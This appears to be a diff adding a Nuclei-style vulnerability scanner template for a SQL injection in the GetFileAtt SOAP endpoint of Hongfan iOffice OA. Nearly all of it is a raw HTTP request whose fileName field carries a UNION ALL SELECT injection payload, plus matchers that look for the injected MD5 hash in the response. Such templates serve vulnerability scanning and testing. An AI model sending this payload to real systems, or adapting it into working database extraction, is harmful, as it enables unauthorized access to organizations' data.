@@ -1,0 +1,39 @@
+id: hongfan-ioffice-AttFile-sqli
+info:
+  name: hongfan-ioffice-AttFile-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://github.com/ibaiw/2023Hvv/blob/main/%E7%BA%A2%E5%B8%86%20oa%20%E6%B3%A8%E5%85%A5.md
+  tags: ioffice
+http:
+  - raw:
+      - |-
+        POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://tempuri.org/GetFileAtt"
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Length: 443
+
+        <?xml version="1.0" encoding="utf-8"?><soap:Envelope
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
+        xmlns="http://tempuri.org/"><fileName>123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','82161')),3,32)-- aCWL</fileName></GetFileAtt> </soap:Body></soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - 3648099174dfbd954311cf9899b21d23
